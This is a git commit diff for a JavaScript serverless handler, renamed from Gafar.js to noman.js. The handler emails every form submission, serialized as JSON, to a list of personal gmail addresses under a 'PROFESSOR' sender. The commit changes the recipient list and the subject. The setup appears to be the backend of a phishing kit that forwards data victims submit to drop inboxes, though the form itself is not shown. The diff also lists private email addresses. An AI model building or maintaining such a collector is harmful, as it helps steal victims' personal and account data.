ee5d30a136e794b245c192c0763acf342807369a
zm9807350 <zm9807350@gmail.com>
2026-01-21 11:31:08 +0500

    Update and rename Gafar.js to noman.js

--- noman.js
+++ noman.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,submitdispute@gmail.com,newzatpage@gmail.com,nizamnaighafar@gmail.com",
-      subject: "Gafar",
+      to: "linkquarry@gmail.com,submitdispute@gmail.com,newzatpage@gmail.com,barbeangle5@gmail.com,nadeemalinizamani45@gmail.com",
+      subject: "Noman",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
